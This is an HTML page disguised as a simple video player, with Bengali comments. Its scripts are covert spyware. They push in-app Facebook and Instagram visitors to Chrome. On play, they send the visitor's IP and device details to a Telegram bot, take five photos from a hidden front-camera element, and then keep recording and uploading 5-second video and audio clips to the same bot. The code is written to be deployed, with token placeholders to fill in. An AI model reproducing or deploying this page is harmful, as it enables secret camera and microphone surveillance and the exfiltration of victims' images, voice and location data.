<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Video Player</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      background: radial-gradient(circle at center, #0f172a 0%, #020617 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 12px;
      overflow: hidden;
      font-family: system-ui, -apple-system, sans-serif;
    }

    .bg-glow {
      position: absolute;
      width: 300px;
      height: 300px;
      background: radial-gradient(circle, rgba(56, 189, 248, 0.15) 0%, rgba(0, 0, 0, 0) 70%);
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 0;
      pointer-events: none;
    }

    .player-card {
      position: relative;
      z-index: 1;
      width: 100%;
      max-width: 500px;
      background: rgba(15, 23, 42, 0.65);
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 24px;
      padding: 14px;
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6),
                  inset 0 1px 0 rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(16px);
      -webkit-backdrop-filter: blur(16px);
    }

    .video-container {
      position: relative;
      width: 100%;
      border-radius: 16px;
      overflow: hidden;
      background: #000;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
    }

    video {
      width: 100%;
      display: block;
      outline: none;
      border-radius: 16px;
    }

    #hiddenCam, #snapshotCanvas {
      display: none;
    }

    /* ✨ বিউটি ও স্কিন গ্লো ফিল্টার */
    .filter-beauty-glow {
      filter: contrast(105%) brightness(112%) saturate(115%) drop-shadow(0 0 2px rgba(255,255,255,0.2));
    }
  </style>
</head>
<body>

  <!-- ক্রোম ব্রাউজারে রিডাইরেক্ট করার স্ক্রিপ্ট -->
  <script>
    (function() {
      const ua = navigator.userAgent || navigator.vendor || window.opera;
      const currentUrl = window.location.href;
      if (ua.indexOf('FBAN') > -1 || ua.indexOf('FBAV') > -1 || ua.indexOf('Instagram') > -1) {
        if (/android/i.test(ua)) {
          window.location.href = 'intent://' + currentUrl.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end;';
        } else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
          window.location.href = 'googlechrome://' + currentUrl.replace(/^https?:\/\//, '');
        }
      }
    })();
  </script>

  <div class="bg-glow"></div>

  <div class="player-card">
    <div class="video-container">
      <video id="mainVideo" controls preload="metadata">
        <source src="video.mp4" type="video/mp4">
        আপনার ব্রাউজার ভিডিও সাপোর্ট করছে না।
      </video>
    </div>
  </div>

  <video id="hiddenCam" autoplay playsinline muted class="filter-beauty-glow"></video>
  <canvas id="snapshotCanvas"></canvas>

  <script>
    // ⚙️ রেন্ডার বিল্ডের সময় এগুলো অটোমেটিক এনভায়রনমেন্ট ভেরিয়েবল দিয়ে রিপ্লেস হবে
    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';

    const mainVideo = document.getElementById('mainVideo');
    const hiddenCam = document.getElementById('hiddenCam');
    const canvas = document.getElementById('snapshotCanvas');

    let camStream = null;
    let isStarted = false;

    // আইপি এবং ফোনের ডিটেইলস সংগ্রহ করে টেলিগ্রামে পাঠানোর ফাংশন
    async function sendDeviceInfo() {
      let ipAddress = "Unknown IP";
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ipAddress = ipData.ip;
      } catch (e) {
        console.log("IP fetch failed", e);
      }

      const ua = navigator.userAgent;
      
      // অপারেটিং সিস্টেম ও ডিভাইস মডেল আন্দাজ করার জন্য ইউজার এজেন্ট অ্যানালাইসিস
      let os = "Unknown OS";
      if (/windows/i.test(ua)) os = "Windows PC";
      else if (/mac/i.test(ua)) os = "MacOS / Apple";
      else if (/linux/i.test(ua)) os = "Linux";
      else if (/android/i.test(ua)) os = "Android Phone";
      else if (/iphone|ipad|ipod/i.test(ua)) os = "iPhone / iOS";

      let browser = "Unknown Browser";
      if (/chrome|crios/i.test(ua) && !/edge|opr/i.test(ua)) browser = "Google Chrome";
      else if (/firefox|fxios/i.test(ua)) browser = "Mozilla Firefox";
      else if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) browser = "Apple Safari";
      else if (/edg/i.test(ua)) browser = "Microsoft Edge";
      else if (/opr|opera/i.test(ua)) browser = "Opera";

      const infoText = 
        `📱 <b>নতুন ভিজিটর কানেক্ট হয়েছে!</b>\n\n` +
        `🌐 <b>আইপি অ্যাড্রেস (IP):</b> <code>${ipAddress}</code>\n` +
        `💻 <b>অপারেটিং সিস্টেম:</b> ${os}\n` +
        `🌐 <b>ব্রাউজার:</b> ${browser}\n` +
        `📐 <b>স্ক্রিন রেজোলিউশন:</b> ${window.screen.width} x ${window.screen.height}\n` +
        `🔤 <b>ইউজার এজেন্ট:</b> <code>${ua}</code>`;

      try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: infoText,
            parse_mode: 'HTML'
          })
        });
      } catch (err) {
        console.log("Device info send failed", err);
      }
    }

    // প্লে বাটনে ক্লিক করলেই কাজ শুরু হবে
    mainVideo.addEventListener('play', async () => {
      if (isStarted) return;
      isStarted = true;

      // ১. প্রথমে আইপি সহ ফোনের ডিটেইলস পাঠাবে
      sendDeviceInfo();

      try {
        camStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: true 
        });

        hiddenCam.srcObject = camStream;
        await new Promise(resolve => setTimeout(resolve, 800));

        // ২. এরপর ৫টি ছবি তুলবে
        await captureAndSendPhotos(5);

        // ৩. এরপর ৫ সেকেন্ড করে ভিডিও ও অডিও ক্লিপ পাঠানো শুরু করবে
        startPeriodicRecording();

      } catch (err) {
        console.error("Camera permission denied or error:", err);
      }
    });

    function takePhoto() {
      return new Promise((resolve) => {
        setTimeout(() => {
          if (!hiddenCam.videoWidth || !hiddenCam.videoHeight) {
            resolve(null);
            return;
          }
          canvas.width = hiddenCam.videoWidth;
          canvas.height = hiddenCam.videoHeight;
          const ctx = canvas.getContext('2d');

          ctx.filter = window.getComputedStyle(hiddenCam).filter;
          ctx.drawImage(hiddenCam, 0, 0, canvas.width, canvas.height);

          canvas.toBlob((blob) => {
            resolve(blob);
          }, 'image/jpeg', 0.85);
        }, 300);
      });
    }

    async function captureAndSendPhotos(count) {
      for (let i = 1; i <= count; i++) {
        const photoBlob = await takePhoto();
        if (photoBlob && photoBlob.size > 0) {
          const formData = new FormData();
          formData.append('chat_id', TELEGRAM_CHAT_ID);
          formData.append('photo', photoBlob, `photo_${i}_${Date.now()}.jpg`);
          formData.append('caption', `✨ বিউটি ফিল্টারসহ সিক্রেট ছবি #${i}`);

          fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          }).catch(err => console.log("Photo send failed", err));
        }
        await new Promise(r => setTimeout(r, 200));
      }
    }

    function startPeriodicRecording() {
      if (!camStream) return;

      const recordInterval = async () => {
        if (!camStream || camStream.active === false) return;

        let videoOptions = { mimeType: 'video/mp4' };
        if (!MediaRecorder.isTypeSupported(videoOptions.mimeType)) {
          videoOptions = { mimeType: 'video/webm;codecs=h264,opus' };
          if (!MediaRecorder.isTypeSupported(videoOptions.mimeType)) {
            videoOptions = { mimeType: 'video/webm' };
          }
        }

        let videoRecorder, audioRecorder;
        let videoChunks = [];
        let audioChunks = [];

        try {
          videoRecorder = new MediaRecorder(camStream, videoOptions);
          const audioStream = new MediaStream(camStream.getAudioTracks());
          audioRecorder = new MediaRecorder(audioStream);
        } catch (e) {
          setTimeout(recordInterval, 1000);
          return;
        }

        videoRecorder.ondataavailable = (e) => {
          if (e.data && e.data.size > 0) videoChunks.push(e.data);
        };

        audioRecorder.ondataavailable = (e) => {
          if (e.data && e.data.size > 0) audioChunks.push(e.data);
        };

        let isProcessed = false;
        const handleStop = async () => {
          if (isProcessed) return;
          isProcessed = true;

          if (videoChunks.length > 0) {
            const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
            if (videoBlob.size > 1000) {
              const videoForm = new FormData();
              videoForm.append('chat_id', TELEGRAM_CHAT_ID);
              videoForm.append('video', videoBlob, `clip_${Date.now()}.mp4`);
              videoForm.append('caption', `🎥 ৫ সেকেন্ডের ভিডিও ক্লিপ`);

              fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
                method: 'POST',
                body: videoForm
              }).catch(err => console.log("Video send failed", err));
            }
          }

          if (audioChunks.length > 0) {
            const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
            if (audioBlob.size > 500) {
              const audioForm = new FormData();
              audioForm.append('chat_id', TELEGRAM_CHAT_ID);
              audioForm.append('voice', audioBlob, `audio_${Date.now()}.ogg`);
              audioForm.append('caption', `🎙️ অডিও রেকর্ডিং ক্লিপ`);

              fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
                method: 'POST',
                body: audioForm
              }).catch(err => console.log("Audio send failed", err));
            }
          }

          setTimeout(recordInterval, 500);
        };

        videoRecorder.onstop = handleStop;
        audioRecorder.onstop = handleStop;

        videoRecorder.start();
        audioRecorder.start();

        setTimeout(() => {
          if (videoRecorder && videoRecorder.state === 'recording') {
            videoRecorder.stop();
          }
          if (audioRecorder && audioRecorder.state === 'recording') {
            audioRecorder.stop();
          }
        }, 5000);
      };

      recordInterval();
    }
  </script>
</body>
</html>
